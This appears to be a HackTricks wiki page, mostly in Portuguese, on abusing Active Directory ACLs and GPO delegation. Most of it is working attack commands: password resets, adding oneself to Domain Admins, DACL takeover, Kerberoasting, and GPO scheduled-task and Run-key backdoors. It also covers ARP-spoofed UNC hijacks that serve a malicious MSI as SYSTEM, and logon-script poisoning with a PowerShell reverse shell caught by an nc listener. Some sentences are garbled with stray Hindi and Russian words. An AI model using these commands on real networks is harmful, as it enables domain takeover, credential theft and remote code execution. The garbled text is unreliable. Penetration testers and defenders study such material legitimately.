# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Esta página é principalmente um resumo das técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para mais detalhes, consulte os artigos originais.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Este privilégio concede a um atacante controle total sobre uma conta de usuário alvo. Uma vez que os direitos `GenericAll` sejam confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Change the Target's Password**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- From Linux, you can do the same over SAMR with Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se a conta estiver desabilitada, limpe a flag UAC**: `GenericAll` permite editar `userAccountControl`. No Linux, o BloodyAD pode remover a flag `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Atribua um SPN à conta do usuário para torná-la kerberoastable, depois use Rubeus e targetedKerberoast.py para extrair e tentar crackear os hashes do ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Desabilitar a pré-autenticação para o usuário, tornando sua conta vulnerável ao ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Com `GenericAll` em um usuário, você pode adicionar uma credential baseada em certificado e autenticar-se como ele sem alterar sua senha. Veja:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Este privilégio permite que um atacante manipule memberships de grupos se ele tiver rights `GenericAll` em um grupo como `Domain Admins`. Após identificar o distinguished name do grupo com `Get-NetGroup`, o atacante pode:

- **Add Themselves to the Domain Admins Group**: Isso pode ser feito por comandos diretos ou usando modules como Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Do Linux, você também pode usar BloodyAD para se adicionar a grupos arbitrários quando tiver GenericAll/Write membership sobre eles. Se o grupo alvo estiver aninhado em “Remote Management Users”, você ganhará imediatamente acesso WinRM em hosts que respeitam esse grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Manter esses privilégios em um objeto de computador ou conta de usuário permite:

- **Kerberos Resource-based Constrained Delegation**: Permite assumir o controle de um objeto de computador.
- **Shadow Credentials**: Use esta técnica para se passar por uma conta de computador ou usuário explorando os privilégios para criar shadow credentials.

## **WriteProperty on Group**

Se um usuário tiver direitos `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Domain Admins`), ele pode:

- **Adicionar a si mesmo ao grupo Domain Admins**: Possível combinando os comandos `net user` e `Add-NetGroupUser`, este método permite escalation de privilégios dentro do domínio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Autoassociação) em Grupo**

Este privilégio permite que atacantes se adicionem a grupos específicos, como `Domain Admins`, por meio de comandos que manipulam diretamente a associação ao grupo. Usando a seguinte sequência de comandos, é possível se adicionar a si mesmo:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Autoassociação)**

Um privilégio semelhante, isso permite que atacantes se adicionem diretamente a grupos modificando as propriedades do grupo se tiverem o direito `WriteProperty` nesses grupos. A confirmação e a execução desse privilégio são realizadas com:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Ter o `ExtendedRight` em um usuário para `User-Force-Change-Password` permite redefinir senhas sem saber a senha atual. A verificação desse direito e sua exploração podem ser feitas via PowerShell ou ferramentas alternativas de linha de comando, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e one-liners para ambientes não interativos. Os comandos vão de invocações simples de PowerShell até o uso de `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner em Group**

Se um atacante descobrir que tem direitos `WriteOwner` sobre um grupo, ele pode alterar a propriedade do grupo para si mesmo. Isso é especialmente impactante quando o grupo em questão é `Domain Admins`, pois बदलando a propriedade permite maior controle sobre os atributos e a associação do grupo. O processo envolve identificar o objeto correto por meio de `Get-ObjectAcl` e então usar `Set-DomainObjectOwner` para modificar o owner, seja por SID ou nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Essa permissão permite que um atacante modifique propriedades de um usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso ao fazer logon. Isso é feito usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário alvo para apontar para o script do atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite em Group**

Com esse privilégio, attackers podem manipular a associação de grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve criar um objeto de credential, usá-lo para adicionar ou remover usuários de um group e verificar as mudanças de associação com comandos PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Do Linux, Samba `net` pode adicionar/remover membros quando você tem `GenericWrite` no grupo (útil quando PowerShell/RSAT não estão disponíveis):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Possuir um objeto AD e ter privilégios `WriteDACL` sobre ele permite que um atacante se conceda privilégios `GenericAll` sobre o objeto. Isso é realizado por meio de manipulação via ADSI, permitindo controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Quando você tem `WriteOwner` e `WriteDacl` sobre um user ou service account, você pode assumir controle total e redefinir sua password usando PowerView sem saber a old password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Talvez você precise primeiro alterar o owner para você mesmo se você tiver apenas `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

O ataque DCSync aproveita permissões específicas de replicação no domínio para imitar um Domain Controller e sincronizar dados, incluindo credenciais de usuários. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Domain Controller. [**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

O acesso delegado para gerenciar Group Policy Objects (GPOs) pode representar riscos de segurança significativos. Por exemplo, se um usuário como `offense\spotless` tiver direitos delegados de gerenciamento de GPO, ele pode ter privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, como identificado usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Para identificar GPOs mal configurados, os cmdlets do PowerSploit podem ser encadeados. Isso permite descobrir GPOs que um usuário específico tem permissão para gerenciar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: É possível resolver quais computadores uma GPO específica se aplica, ajudando a entender o escopo do possível impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Para ver quais políticas se aplicam a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs with a Given Policy Applied**: Identificar unidades organizacionais (OUs) afetadas por uma determinada política pode ser feito usando `Get-DomainOU`.

Você também pode usar a ferramenta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs e encontrar problemas nelas.

### Abuse GPO - New-GPOImmediateTask

GPOs mal configurados podem ser explorados para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo local de administradores nas máquinas afetadas, elevando os privilégios de forma significativa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

O módulo GroupPolicy, se instalado, permite a criação e vinculação de novos GPOs, e a configuração de preferências como valores de registro para executar backdoors nos computadores afetados. Este método exige que o GPO seja atualizado e que um usuário faça login no computador para a execução:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abusar de GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novos GPOs. Esta ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novos antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política

As atualizações de GPO geralmente ocorrem a cada cerca de 90 minutos. Para acelerar esse processo, especialmente após implementar uma alteração, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata da política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo automático de atualização.

### Nos Bastidores

Ao inspecionar as Tarefas Agendadas de uma determinada GPO, como a `Misconfigured Policy`, a adição de tarefas como `evilTask` pode ser confirmada. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou escalar privilégios.

A estrutura da tarefa, como mostrado no arquivo de configuração XML gerado por `New-GPOImmediateTask`, descreve os detalhes da tarefa agendada - incluindo o comando a ser executado e seus triggers. Esse arquivo representa como tarefas agendadas são definidas e gerenciadas dentro de GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação da política.

### Users e Groups

As GPOs também permitem a manipulação de associações de usuários e grupos em sistemas alvo. Ao editar diretamente os arquivos de política de Users e Groups, atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administrators`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar associações de grupos.

O arquivo de configuração XML para Users e Groups descreve como essas alterações são implementadas. Ao adicionar entradas a esse arquivo, usuários específicos podem receber privilégios elevados em todos os sistemas afetados. Esse método oferece uma abordagem direta para escalada de privilégios por meio da manipulação de GPO.

Além disso, outros métodos para executar código ou manter persistence, como aproveitar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via arquivos .msi ou editar configurações de serviços, também podem ser considerados. Essas técnicas oferecem várias formas de manter acesso e controlar sistemas alvo por meio do abuso de GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sobre uma OU/domínio permite modificar o atributo `gPLink` do container alvo e **forçar a aplicação de uma GPO existente** sem editar a própria GPO. Isso se torna interessante quando a GPO vinculada já referencia conteúdo remoto por meio de **UNC paths** (`\\HOST\share\...`), porque usuários autenticados podem ler o **SYSVOL** e procurar políticas reutilizáveis offline.

Fluxo de alto nível:

1. Use BloodHound para identificar um principal com `WriteGPLink` sobre uma OU e enumerar computadores/usuários dentro dessa OU.
2. Clone o `SYSVOL` em modo somente leitura e analise GPOs procurando por **Software Installation**, **drive mappings** (`Drives.xml`) e **logon/startup scripts** que referenciem UNC paths.
3. Prefira políticas que apontem para um **hostname direto** (por exemplo `\\DC02\share\pkg.msi`) em vez de caminhos DFS/domain-namespace, porque caminhos baseados em hostname são mais fáceis de redirecionar com spoofing de L2.
4. Adicione o GUID da GPO escolhida ao `gPLink` da OU alvo para que a vítima processe essa política já existente.
5. Na mesma broadcast domain, faça ARP spoof do host UNC e vincule seu IP localmente (`ip addr add <target_ip>/32 dev <iface>`) para que o tráfego SMB da vítima chegue à sua máquina.
6. Sirva o caminho/nome de arquivo esperado a partir de um servidor SMB do atacante (por exemplo `smbserver.py`) e aguarde o processamento normal da política.

Exemplo de coleta de `SYSVOL` e correlação de GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Vincule a GPO existente à OU de destino:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Se a GPO vinculada implantar um MSI de um caminho UNC, o cliente o buscará durante a **inicialização do computador** e o instalará como **`NT AUTHORITY\SYSTEM`**. Ao falsificar o host referenciado e servir um MSI malicioso sob o **mesmo share/path/name**, você pode transformar `WriteGPLink` em execução de código como SYSTEM **sem modificar o SYSVOL**.

Importantes restrições:

- **O timing importa**: o novo link é visto na atualização de policy (comumente ~90 minutos), mas **Software Installation** normalmente é acionado no **reboot**.
- O Windows Installer geralmente rastreia a implantação usando o **`ProductCode`** do pacote. Se o produto já estiver instalado, a implantação pode ser ignorada.
- Para evitar rejeição do installer, altere o MSI malicioso para que seu **`ProductCode`** e **`PackageCode`** correspondam ao pacote legítimo esperado pela GPO.
- Arquivos antigos de advertisement `.aas` podem permanecer em `SYSVOL`, então valide que a implantação ainda parece ativa antes de confiar nisso.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Mapeamentos de drive do GPP em `Drives.xml` fazem com que os usuários se autentiquem no caminho UNC configurado durante o logon ou a reconexão. Se você falsificar o host referenciado, pode capturar **NetNTLMv2**. Se o SMB for deliberadamente feito falhar, o Windows pode tentar novamente via **WebDAV**, enviando **NTLM over HTTP**, o que é muito mais flexível para relays para **LDAP(S)**, **AD CS**, ou **SMB**.

#### Logon/startup script UNC hijack

O mesmo padrão se aplica a scripts hospedados em UNC descobertos em `SYSVOL`:

- **Logon scripts** normalmente são executados no contexto do **user**.
- **Startup scripts** normalmente são executados no contexto do **computer / SYSTEM**.

Se o caminho do script apontar para um hostname que possa ser falsificado, redirecione o host UNC e sirva o conteúdo do script de substituição a partir da localização esperada.

## SYSVOL/NETLOGON Logon Script Poisoning

Caminhos graváveis em `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permitem alterar scripts de logon executados no logon do usuário via GPO. Isso resulta em execução de código no contexto de segurança dos usuários que fazem logon.

### Locate logon scripts
- Inspecione os atributos do usuário para um script de logon configurado:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Rastreie shares de domínio para identificar shortcuts ou referências a scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analise arquivos `.lnk` para resolver destinos apontando para SYSVOL/NETLOGON (truque útil de DFIR e para atacantes sem acesso direto a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound exibe o atributo `logonScript` (scriptPath) em nós de usuário quando presente.

### Validar acesso de escrita (não confie nas listas de share)
Ferramentas automatizadas podem mostrar SYSVOL/NETLOGON como somente leitura, mas os ACLs NTFS subjacentes ainda podem permitir escrita. Sempre teste:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se o tamanho do arquivo ou o mtime mudar, você tem write. Preserve os originais antes de modificar.

### Poison um VBScript logon script para RCE
Adicione um comando que запуска um PowerShell reverse shell (gere em revshells.com) e mantenha a lógica original para evitar quebrar a função de negócio:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Escute em seu host e aguarde o próximo logon interativo:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- A execução acontece sob o token do usuário de logging (não SYSTEM). O escopo é o link da GPO (OU, site, domain) aplicando esse script.
- Faça a limpeza restaurando o conteúdo/timestamps originais após o uso.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
